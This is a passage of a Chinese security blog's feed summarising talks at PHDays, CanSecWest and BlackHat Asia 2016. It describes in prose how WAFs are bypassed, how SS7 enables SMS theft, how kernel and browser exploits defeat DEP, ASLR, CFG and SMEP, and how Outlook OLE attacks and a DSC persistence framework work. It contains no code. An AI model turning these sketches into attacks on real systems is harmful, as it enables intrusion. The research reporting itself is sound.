    <content type="html">&lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。&lt;/p&gt;
&lt;p&gt;今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。&lt;/p&gt;
&lt;h2 id=&quot;议题分析&quot;&gt;&lt;a href=&quot;#议题分析&quot; class=&quot;headerlink&quot; title=&quot;议题分析&quot;&gt;&lt;/a&gt;议题分析&lt;/h2&gt;&lt;p&gt;关于大会议题的在线视频参见：&lt;a href=&quot;http://www.phdays.com/broadcast/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.phdays.com/broadcast/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Building-Honeypots-to-Monitor-DDoS》&quot;&gt;&lt;a href=&quot;#1、《Building-Honeypots-to-Monitor-DDoS》&quot; class=&quot;headerlink&quot; title=&quot;1、《Building Honeypots to Monitor DDoS》&quot;&gt;&lt;/a&gt;1、《Building Honeypots to Monitor DDoS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641437211481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者通过搭建存在DDoS漏洞服务的网络蜜罐，从互联网中提取可视化信息，然后将数据反馈给ELK（Elasticsearch、Logstash、Kibana日志集中分析平台，为保护真实网络财产的系统提供数据支撑。据说，后面作者会开源一个网络管理系统，用于统计外部网络的一些反射DDoS攻击的数据。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》&quot;&gt;&lt;a href=&quot;#2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》&quot; class=&quot;headerlink&quot; title=&quot;2、《Waf.js：How to Protect Web Applications using JavaScript》&quot;&gt;&lt;/a&gt;2、《Waf.js：How to Protect Web Applications using JavaScript》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641534353049.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;使用Javascript代码去防御DOM XSS、CSRF、点击劫持，以及其它攻击环境检测（Beef、Xbackdoor、Acunetix等等）的工具，与Server组使用js防御dom xss的思路类似，只是多了其它几项功能。文档下载：&lt;a href=&quot;http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》&quot;&gt;&lt;a href=&quot;#3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》&quot; class=&quot;headerlink&quot; title=&quot;3、《Scalable and Effective Fuzzing of Google Chrome Browser》&quot;&gt;&lt;/a&gt;3、《Scalable and Effective Fuzzing of Google Chrome Browser》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641573779613.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;介绍Google的分布式Fuzzing系统——CluterFuzz，采用集群服务器进行分布式Fuzzing，大概4000多台机器，不排除使用虚拟机的情况。议题介绍了一些Fuzz变异算法、漏洞类型识别、代码覆盖率问题、自动化精简样本，以及各种sanitizers功能的使用，比较常用的还是Address Sanitizer，且各平台通用。&lt;/p&gt;
&lt;h3 id=&quot;4、《Web-Application-Firewall-Bypassing》&quot;&gt;&lt;a href=&quot;#4、《Web-Application-Firewall-Bypassing》&quot; class=&quot;headerlink&quot; title=&quot;4、《Web Application Firewall Bypassing》&quot;&gt;&lt;/a&gt;4、《Web Application Firewall Bypassing》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641659037475.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;总结绕过AWF的三大策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1、预处理利用&lt;/strong&gt;：即设法绕过WAF的输入验证，比如HTTP头（X-Originating-IP、X-Forwarded-For、X-Remote-IP、X-Remote-Addr）的处理，就曾多次被用于绕过公司WAF的SQL注入防护，或者HTTP方法头GET/POST的篡改、换行符的处理等等方式；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2、致阻断失配&lt;/strong&gt;：利用前后端数据处理的差异，使得无法匹配到黑名单里的规则，通常结合一些参数污染、字符编码、注释符等多种方式绕过；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3、规则集绕过&lt;/strong&gt;：通过暴力枚举出WAF的拦截规则，或者逆向WAF程序获取规则，然后再设法绕过。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》&quot;&gt;&lt;a href=&quot;#5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》&quot; class=&quot;headerlink&quot; title=&quot;5、《Mobile Communications are Insecure. Evidence-Based Arguments》&quot;&gt;&lt;/a&gt;5、《Mobile Communications are Insecure. Evidence-Based Arguments》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14642298519901.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于当前移动通讯网络采用许多过旧技术，导致一些漏洞遗留其中，主要是针对SS7第7号信令系统的漏洞情况进行统计，其中主要三大威胁是：拒绝服务、信息泄露（比如短信、通话内容、IMEI、地理位置等等）、欺诈。并现场演示短信窃取，实现社交帐号的盗取，并成功获取历史聊天记录。&lt;/p&gt;
&lt;h3 id=&quot;6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》&quot;&gt;&lt;a href=&quot;#6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》&quot; class=&quot;headerlink&quot; title=&quot;6、《Fingerprinting and Attacking a Healthcare Infrastructure》&quot;&gt;&lt;/a&gt;6、《Fingerprinting and Attacking a Healthcare Infrastructure》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14642478498497.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;作者分享了一些关于医疗设备攻击的思路，比如通过网络空间搜索引擎Shodan/Censys/Maltego去查找网络上的医疗设备，介绍如何通过设备指纹去查找医疗设备，目前很多医疗设备存在允许未授权的访问，特别容易导致敏感信息泄露，甚至允许远程操作医疗设备，可能影响到患者的健康问题，最后他提供一些针对医疗设备攻击的防御方案。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。&lt;/p&gt;
&lt;p&gt;今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。&lt;/p&gt;
&lt;h2 id=&quot;议题分析&quot;&gt;&lt;a href=&quot;#议题分析&quot; class=&quot;headerlink&quot; title=&quot;议题分析&quot;&gt;&lt;/a&gt;议题分析&lt;/h2&gt;&lt;p&gt;关于大会议题的在线视频参见：&lt;a href=&quot;http://www.phdays.com/broadcast/&quot;&gt;http://www.phdays.com/broadcast/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Building-Honeypots-to-Monitor-DDoS》&quot;&gt;&lt;a href=&quot;#1、《Building-Honeypots-to-Monitor-DDoS》&quot; class=&quot;headerlink&quot; title=&quot;1、《Building Honeypots to Monitor DDoS》&quot;&gt;&lt;/a&gt;1、《Building Honeypots to Monitor DDoS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641437211481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者通过搭建存在DDoS漏洞服务的网络蜜罐，从互联网中提取可视化信息，然后将数据反馈给ELK（Elasticsearch、Logstash、Kibana日志集中分析平台，为保护真实网络财产的系统提供数据支撑。据说，后面作者会开源一个网络管理系统，用于统计外部网络的一些反射DDoS攻击的数据。&lt;br&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="PHDays" scheme="http://riusksk.github.io/tags/PHDays/"/>
    
  </entry>
  
  <entry>
    <title>CanSecWest 2016 大会议题分析</title>
    <link href="http://riusksk.github.io/2016/04/13/CanSecWest_2016/"/>
    <id>http://riusksk.github.io/2016/04/13/CanSecWest_2016/</id>
    <published>2016-04-13T03:47:32.000Z</published>
    <updated>2016-06-24T14:48:30.000Z</updated>
    
    <content type="html">&lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/CanSecWest/presentations&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/CanSecWest/presentations&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot;&gt;&lt;a href=&quot;#1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot; class=&quot;headerlink&quot; title=&quot;1、《Sandbox Escape with Generous Help from Security Software》&quot;&gt;&lt;/a&gt;1、《Sandbox Escape with Generous Help from Security Software》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605295530449.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯玄武实验室分享的杀毒软件漏洞挖掘技巧，比如BitDefender、Comodo、Avast、Kaspersky等等国外知名杀软厂商，大多是一些敏感功能未鉴权导致的代码执行或者信息泄露的问题，比如攻击者伪造IO请求去读写、执行本地文件。这里比较好的一点是在漏洞利用场景上，他们将杀软漏洞用来绕过沙盒保护，因为杀软漏洞可以直接以System最高权限执行，允许直接关闭一些软件的沙盒防护。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》&quot;&gt;&lt;a href=&quot;#2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》&quot; class=&quot;headerlink&quot; title=&quot;2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》&quot;&gt;&lt;/a&gt;2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605302948646.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯科恩实验室分享的关于OSX/iOS内核驱动漏洞挖掘的方法，主要介绍了两种Fuzzing策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;被动Fuzzing&lt;/strong&gt;：&lt;strong&gt;通过Hook IOKit API（IOConnectMapMemory/IOConnectUnmapMemory/IOConnectCallMethod/IOConnectCallScalarMethod），随机变异参数值&lt;/strong&gt;；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主动Fuzzing&lt;/strong&gt;：&lt;strong&gt;通过脚本自动提取驱动的接口函数与参数信息，然后发送畸形数据去调用&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后列举一个竞争条件漏洞实例，介绍漏洞成因与利用方法。&lt;/p&gt;
&lt;h3 id=&quot;3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》&quot;&gt;&lt;a href=&quot;#3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》&quot; class=&quot;headerlink&quot; title=&quot;3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》&quot;&gt;&lt;/a&gt;3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605312840771.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享自动生成利用代码的工具AEG，主要针对混合读写操作导致的漏洞，通过PIN进行指令插桩，利用符号执行（Symbolic Execution）和混合执行（Concolic Execution）一块去实现程序的动态分析与利用代码生成。&lt;br&gt;&lt;strong&gt;PS：整体思路跟以往挖掘漏洞中用于分析代码执行路径，增加代码覆盖率的思路一致，用在漏洞挖掘与分析上比较可行，但自动生成利用代码估计效果不好。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;4、《Pwn-a-Nexus-device-with-a-single-vulnerability》&quot;&gt;&lt;a href=&quot;#4、《Pwn-a-Nexus-device-with-a-single-vulnerability》&quot; class=&quot;headerlink&quot; title=&quot;4、《Pwn a Nexus device with a single vulnerability》&quot;&gt;&lt;/a&gt;4、《Pwn a Nexus device with a single vulnerability》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605317938560.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自360的分享，是其在Pwn2Own Mobile 2015上用于攻破Nexus手机的chrome浏览器漏洞CVE-2015-6764。议题对该漏洞的成因、利用和补丁代码都进行了分析，是一个越界访问漏洞，通过越界读写内存造成地址泄露，从而再绕过ASLR。该议题提到的利用方式（&lt;strong&gt;RCE2UXSS、UXSS2RCE&lt;/strong&gt;）比较奇妙,在利用漏洞获取执行代码的权限后，&lt;strong&gt;通过hook ScriptLoader::executeScript去注入Javascript代码，然后在 &lt;a href=&quot;https://play.goolge.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://play.goolge.com&lt;/a&gt; 域下通过JS去安装任意APP&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;5、《BadWinmail-and-Email-Security-on-Outlook》&quot;&gt;&lt;a href=&quot;#5、《BadWinmail-and-Email-Security-on-Outlook》&quot; class=&quot;headerlink&quot; title=&quot;5、《BadWinmail and Email Security on Outlook》&quot;&gt;&lt;/a&gt;5、《BadWinmail and Email Security on Outlook》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605992256618.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在msg文件格式中嵌入OLE对象，然后更改CLSID为Flash控件或者PDF控件，利用这些控件的漏洞直接实现利用。另外还可传输不确定封装格式 (TNEF，附件名为winmail.dat) ，它也支持OLE，然后采用上述相同攻击方法实现利用。用户在使用Outlook打开上述邮件时即可直接执行任意代码。&lt;/p&gt;
&lt;h3 id=&quot;6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》&quot;&gt;&lt;a href=&quot;#6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》&quot; class=&quot;headerlink&quot; title=&quot;6、《Getting Physical Extreme abuse of Intel based Paging Systems》&quot;&gt;&lt;/a&gt;6、《Getting Physical Extreme abuse of Intel based Paging Systems》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606052304309.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讲述利用操作系统的分页机制去绕过各种内核安全机制，比如DEP、KASLR、NULL解引用保护、SMEP等等，主要针对Linux与Windows，并提供有demo代码。传统方法可能更多的是借助信息泄露漏洞，利用泄露地址去绕过上述保护，利用他们提供的方法甚至可允许非特权用户dump到内核访问的物理内存。主要利用以下缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分页表位于固定虚拟地址（Windows）；&lt;/li&gt;
&lt;li&gt;分页表可写(Windows);&lt;/li&gt;
&lt;li&gt;PDPTs、PDs与PTs位于固定虚拟地址（Linux）;&lt;/li&gt;
&lt;li&gt;分页结构可写（Linux)。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比如Windows上，可以利用任意写地址漏洞去将PTE分页表（固定地址）中的指针修改为HAL堆上的物理内存地址,HAL堆上包含有一堆函数指针，包括hal!HalpApicRequestInterrupt函数，最后结合ROP就可以禁用SMEP保护，最终获得系统权限。还有其它页目录堆喷的利用方式，Linux上稍有不同，但攻击思路类似。&lt;/p&gt;
&lt;h3 id=&quot;7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》&quot;&gt;&lt;a href=&quot;#7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》&quot; class=&quot;headerlink&quot; title=&quot;7、《Execute My Packet (Exodus of Shells from a Firewall)》&quot;&gt;&lt;/a&gt;7、《Execute My Packet (Exodus of Shells from a Firewall)》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606157550780.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Cisco ASA Adaptive Security Appliance是个IP路由器，具备防火墙、反病毒、入侵检测和VPN服务器的功能，它的IKE(网络密钥交换)版本v1和v2存在堆溢出漏洞（CVE-2016-1287），利用漏洞允许未授权的用户实现远程代码执行。该议题分析了导致漏洞的成因以及利用方法，目前官方已修复此漏洞。&lt;/p&gt;
&lt;h3 id=&quot;8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》&quot;&gt;&lt;a href=&quot;#8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》&quot; class=&quot;headerlink&quot; title=&quot;8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》&quot;&gt;&lt;/a&gt;8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606192691752.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者在不借助地址泄露的情况下，使用“崩溃恢复”（Crash-Resistant）功能去绕过DEP、ASLR、CFG等多个安全机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;通过内存扫描获取地址&lt;/strong&gt;：结合堆喷射，利用漏洞篡改数据类型相关（比如整数）的1个字节，从而伪造出JS对象，接着在web worker中使用setInerval函数去使用伪造的JS对象，这里使用setInerval是为了使用Crash-Resistant功能，有了JS对象就有了可控的虚表指针，再通过扫描内存获取TEB（线程环境块）基址、DLL基址等信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;创建Blob对象来绕过EAF+&lt;/strong&gt;：另外还演示了如何绕过EMEt 5.5 的EAF和EAF+保护，作者通过创建Blob对象来解决，因为它会调用到未在EAF+黑名单里面的ntdll模块，进而解决导出表的安全限制问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用函数链（Function Chaining）绕过CFG&lt;/strong&gt;：在控制虚表函数指针后，利用5个未被EMET禁用的导出函数（利用networkx 和miasm2工具去搜索的），依次调用组成一个函数调用链，最终调用LdrInitShimEngineDynamic([fakeStr + 0x8] + 0x20, [fakeStr] + 0x18)，这里的两个参数都是可控的，从而实现任意DLL的加载。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;9、《Virtualization-Device-Emulator-Testing-Technology》&quot;&gt;&lt;a href=&quot;#9、《Virtualization-Device-Emulator-Testing-Technology》&quot; class=&quot;headerlink&quot; title=&quot;9、《Virtualization Device Emulator Testing Technology》&quot;&gt;&lt;/a&gt;9、《Virtualization Device Emulator Testing Technology》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606253312145.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过分析虚拟设备模拟器的攻击面，主要针对各个硬件虚拟组件进行Fuzzing，通过系统hook模块去获取各个设备模拟器，然后从服务端向各个模拟器客户端发送畸形数据，再根据客户端返回的日志进行分析。&lt;/p&gt;
&lt;h3 id=&quot;10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》&quot;&gt;&lt;a href=&quot;#10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》&quot; class=&quot;headerlink&quot; title=&quot;10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》&quot;&gt;&lt;/a&gt;10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606908008051.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hardsploit项目是一个硬件安全审计框架，支持多种硬件接口，比如I2C, JTAG, SPI, PARALLEL, UART，主要应用在物联网产品的安全审计上。通过工具可以提取存储在芯片上各种数据，读写以及嗅探传输数据，便于后续作分析，而且还提供有界面、API接口等等功能。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/CanSecWest/presentations&quot;&gt;http://www.slideshare.net/CanSecWest/presentations&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot;&gt;&lt;a href=&quot;#1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot; class=&quot;headerlink&quot; title=&quot;1、《Sandbox Escape with Generous Help from Security Software》&quot;&gt;&lt;/a&gt;1、《Sandbox Escape with Generous Help from Security Software》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605295530449.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯玄武实验室分享的杀毒软件漏洞挖掘技巧，比如BitDefender、Comodo、Avast、Kaspersky等等国外知名杀软厂商，大多是一些敏感功能未鉴权导致的代码执行或者信息泄露的问题，比如攻击者伪造IO请求去读写、执行本地文件。这里比较好的一点是在漏洞利用场景上，他们将杀软漏洞用来绕过沙盒保护，因为杀软漏洞可以直接以System最高权限执行，允许直接关闭一些软件的沙盒防护。&lt;/p&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="CanSecWest" scheme="http://riusksk.github.io/tags/CanSecWest/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Asia 2016 大会议题分析报告</title>
    <link href="http://riusksk.github.io/2016/04/05/bh-asia-2016/"/>
    <id>http://riusksk.github.io/2016/04/05/bh-asia-2016/</id>
    <published>2016-04-05T02:27:11.000Z</published>
    <updated>2016-06-24T14:48:46.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New CVE-2015-0057 Exploit Technology》&quot;&gt;&lt;/a&gt;1、《A New CVE-2015-0057 Exploit Technology》&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598336783953.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。&lt;br&gt;&lt;strong&gt;【传统攻击方法】&lt;/strong&gt;：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。&lt;br&gt;&lt;strong&gt;【新型攻击方法】&lt;/strong&gt;：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》&quot;&gt;&lt;a href=&quot;#2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》&quot; class=&quot;headerlink&quot; title=&quot;2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》&quot;&gt;&lt;/a&gt;2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598369926110.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;东北大学（美国）的4位安全研究员开发出一款叫CrossFire的轻量级静态分析工具，用于自动化挖掘Firefox插件漏洞（对方称为”Externsion-reuse“漏洞），其实就是利用插件原有的敏感功能去执行恶意行为，比如窃取cookie、历史记录等敏感信息。Firefox插件是通过Javascript调用Friefox提供的API实现的附加功能，因此CrossFire是通过静态分析插件的JS代码，构建出抽象语法树，然后跟收集的敏感API数据库做综合分析，API数据库就是定义输入源（source）和输出目标（sink）的内容，然后基于污点传播的思路去做判断，如果检测到漏洞还可以根据原定规则生成exploit。&lt;br&gt;&lt;strong&gt;【PS】&lt;/strong&gt;:==基于污点传播的静态分析思路，偏学术研究，估计误报会比较多，往往还需要人工介入排查，效果不见得会很好。==&lt;/p&gt;
&lt;h3 id=&quot;3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》&quot;&gt;&lt;a href=&quot;#3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》&quot; class=&quot;headerlink&quot; title=&quot;3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》&quot;&gt;&lt;/a&gt;3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598401954245.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;关于动态二进制插桩的检测与逃逸方法，用来对抗程序被动态分析,主要针对PIN与DynamoRIO两款插桩工具的特点进行分析。&lt;br&gt;&lt;strong&gt;【检测方法】&lt;/strong&gt;：分主动与被动检测方案，主动检测包括扩展的指令代码（Xmode Code，会导致栈桢大小不同）、代码缓存、TLS和异常上下文，而被动检测包括未支持的指令和行为功能。&lt;br&gt;&lt;strong&gt;【逃逸方法】&lt;/strong&gt;：通过代码缓存进行自修改，以及一些栈、TLS和其它DBI框架特有的数据结构，比如.charmve段、BrokerClient回调函数等等方法入手。&lt;/p&gt;
&lt;h3 id=&quot;4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》&quot;&gt;&lt;a href=&quot;#4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》&quot; class=&quot;headerlink&quot; title=&quot;4、《Bypassing Browser Security Policies For Fun And Profit》&quot;&gt;&lt;/a&gt;4、《Bypassing Browser Security Policies For Fun And Profit》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598412838122.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讲述Android浏览器绕过同源策略的UXSS漏洞，都是以一些历史漏洞为例讲解漏洞的利用方式（含PoC）,包括窃取cookie、读取本地文件，以及绕过Google Play的限制实现任意app的安装。==议题主要是对过去漏洞的总结，并没有太多新颖的思路。==&lt;/p&gt;
&lt;h3 id=&quot;5、《DSCompromised-A-Windows-DSC-Attack-Framework》&quot;&gt;&lt;a href=&quot;#5、《DSCompromised-A-Windows-DSC-Attack-Framework》&quot; class=&quot;headerlink&quot; title=&quot;5、《DSCompromised: A Windows DSC Attack Framework》&quot;&gt;&lt;/a&gt;5、《DSCompromised: A Windows DSC Attack Framework》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598431026382.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;DSC（Desired State Configuration，期望状态配置）是Windows上的配置管理平台，它通过向PowerShell语言中引进一个非常简单的语法声明，和一个用来接收和应用这些配置的内置引擎来实现的。DSCompromised即是一款基于PowerShell的工具，用于借助DSC来实现命令控制、恶意软件驻留、回连后门等等功能。该工具已在github上开源：&lt;a href=&quot;https://github.com/matthastings/DSCompromised。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/matthastings/DSCompromised。&lt;/a&gt;&lt;/p&gt;
